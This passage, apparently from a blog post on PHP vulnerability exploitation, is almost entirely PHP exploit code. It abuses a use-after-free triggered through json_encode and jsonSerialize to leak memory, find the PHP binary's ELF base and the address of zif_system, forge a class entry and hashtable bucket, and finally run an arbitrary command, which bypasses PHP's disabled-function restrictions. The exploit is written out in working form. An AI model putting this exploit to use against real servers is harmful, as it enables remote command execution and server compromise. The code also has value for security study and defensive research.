            $leak = $this-&gt;leak2($data_addr, ($i &#43; 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                $deref = $this-&gt;leak2($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr &#43; $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i&#43;&#43;) {
            $addr = $start - 0x1000 * $i;
            $leak = $this-&gt;leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this-&gt;leak2($addr);
            $f_name = $this-&gt;leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this-&gt;leak2($addr &#43; 8);
            }
            $addr &#43;= 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i &lt; $n_alloc; $i&#43;&#43;)
            $contiguous[] = new DateInterval(&#39;PT1S&#39;);

        $room = [];
        for($i = 0; $i &lt; $n_alloc; $i&#43;&#43;)
            $room[] = new Z();

        $_protector = $this-&gt;ptr2str(0, 78);

        $this-&gt;abc = $this-&gt;ptr2str(0, 79);
        $p = new DateInterval(&#39;PT1S&#39;);

        unset($y[0]);
        unset($p);

        $protector = &#34;.$_protector&#34;;

        $x = new DateInterval(&#39;PT1S&#39;);
        $x-&gt;d = 0x2000;
        $x-&gt;h = 0xdeadbeef;
        # $this-&gt;abc is now of size 0x2000

        if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) {
            die(&#39;UAF failed.&#39;);
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120);
        $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128);
        $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this-&gt;write($this-&gt;abc, 0, 2); # type
        $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i &lt; 16; $i&#43;&#43;) {
            $this-&gt;write($this-&gt;abc, 0x10 &#43; $i * 8, 
                $this-&gt;leak1($class_entry &#43; 0x10 &#43; $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this-&gt;write($this-&gt;abc, 0x30, $abc_addr &#43; $fake_tbl_off);
        $this-&gt;write($this-&gt;abc, 0x38, $abc_addr &#43; $fake_tbl_off);

        # fake zval_reference
        $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr &#43; $fake_tbl_off &#43; 0x10); # zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off &#43; 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this-&gt;leak2($handlers &#43; 0x10);
        if(!($base = $this-&gt;get_binary_base($binary_leak))) {
            die(&#34;Couldn&#39;t determine binary base address&#34;);
        }

        # parse elf header
        if(!($elf = $this-&gt;parse_elf($base))) {
            die(&#34;Couldn&#39;t parse ELF&#34;);
        }

        # get basic_functions address
        if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) {
            die(&#34;Couldn&#39;t get basic_functions address&#34;);
        }

        # find system entry
        if(!($zif_system = $this-&gt;get_system($basic_funcs))) {
            die(&#34;Couldn&#39;t get zif_system address&#34;);
        }
        
        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50);
        for($i = 0; $i &lt; 4; $i&#43;&#43;) {
            $this-&gt;write($this-&gt;abc, $fake_bkt_off &#43; $i * 8, 
                $this-&gt;leak2($function_data &#43; 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr &#43; $fake_bkt_off;
        $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i &lt; 3; $i&#43;&#43;) {
            $this-&gt;write($this-&gt;abc, 0x58 &#43; $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off);
        for($i = 0; $i &lt; 12; $i&#43;&#43;) {
            $this-&gt;write($this-&gt;abc,  $fake_bkt_off &#43; 0x70 &#43; $i * 8, 
                $this-&gt;leak2($function_zval, $i * 8));
        }

        # pwn
        $this-&gt;write($this-&gt;abc, $fake_bkt_off &#43; 0x70 &#43; 0x30, $zif_system);
        $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr &#43; 0x70);

        $spl1-&gt;offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
json_encode([&amp;$y]);
```


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-php%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/  

